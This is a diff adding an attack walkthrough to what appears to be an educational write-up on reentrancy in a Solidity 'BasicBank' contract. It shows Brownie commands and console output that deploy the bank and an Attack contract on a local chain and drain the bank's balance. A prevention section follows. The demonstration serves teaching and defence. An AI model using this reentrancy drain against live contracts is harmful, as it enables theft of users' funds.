@@ -120,9 +120,84 @@ contract Attack{
         }
     }
 }
-```
+``` 
 ## 🕸 Attack
+I use **brownie framework** in *vísual studio code terminal* while attacking that's why I create new project with brownie and add files.
+```
+brownie init
+```
+```
+cd contracts
+```
+Compile contracts.
+```
+brownie compile
+```
+```
+INFO: Could not find files for the given pattern(s).
+Brownie v1.19.1 - Python development framework for Ethereum
 
+Downloading from https://solc-bin.ethereum.org/windows-amd64/solc-windows-amd64-v0.8.17+commit.8df45f5f.exe
+100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 8.95M/8.95M [00:10<00:00, 814kiB/s]
+solc 0.8.17 successfully installed at: C:\Users\pc1\.solcx\solc-v0.8.17\solc.exe
+Compiling contracts...
+  Solc version: 0.8.17
+  Optimizer: Enabled  Runs: 200
+  EVM Version: Istanbul
+Generating build data...
+ - BasicBank
+ - Attack
+```
+Deploy *BasicBank* contract with **brownie console**.
+```
+brownie console
+```
+```
+>>> bank = accounts[0].deploy(BasicBank)
+Transaction sent: 0x3dff3c2bb305d4b3b511181572a2a898db562ea6bb90bbc46859b5bff3d4fed0
+  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
+  BasicBank.constructor confirmed   Block: 1   Gas used: 253317 (2.11%)
+  BasicBank deployed at: 0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87
+```
+
+Afterwards, I deposit money into my user account, just as customers of this bank do.
+```
+>>> bank.deposit({'from': accounts[0], 'value': 10e18})
+Transaction sent: 0xca7331d18bb57baca3b6ade1ce81818fc3b172c5c075998482367c82a45c9aa6
+  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
+  BasicBank.deposit confirmed   Block: 2   Gas used: 42116 (0.35%)
+
+<Transaction '0xca7331d18bb57baca3b6ade1ce81818fc3b172c5c075998482367c82a45c9aa6'>
+
+```
+```
+>>> bank.getBalance(accounts[0])
+10000000000000000000
+```
+The money has been entered into the bank. Why don't we attack?
+Firstly, deploy *Attack* contract and enter target contract address.
+```
+>>> reentracy = accounts[1].deploy(Attack, '0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87')
+Transaction sent: 0xd57f8472a3a7668108ae62f7d52a82180fb7a0ea664090bb2b42d06bf7a6a8c0
+  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
+  Attack.constructor confirmed   Block: 3   Gas used: 204880 (1.71%)
+  Attack deployed at: 0xe7CB1c67752cBb975a56815Af242ce2Ce63d3113
+```
+And reentracy!
+```
+>>> reentracy.attack({'from': accounts[1], 'value':1e18})
+Transaction sent: 0xa139f01266d62f4d82ccd46fb5dc143582c23052f9c9e40026e2091ae2257923
+  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
+  Attack.attack confirmed   Block: 4   Gas used: 239974 (2.00%)
+
+<Transaction '0xa139f01266d62f4d82ccd46fb5dc143582c23052f9c9e40026e2091ae2257923'>
+>>> reentracy.balance()
+11000000000000000000
+```
+```
+>>> bank.balance()
+0
+```
 ## 🤝  How To Prevent Reentracy Attack?
 
 As I mentioned in the analysis part, the order of transactions in the ```withdraw()``` function is constructed with a wrong point of view. Therefore, if the transaction order is made like this way, the reentracy vulnerability will die out.
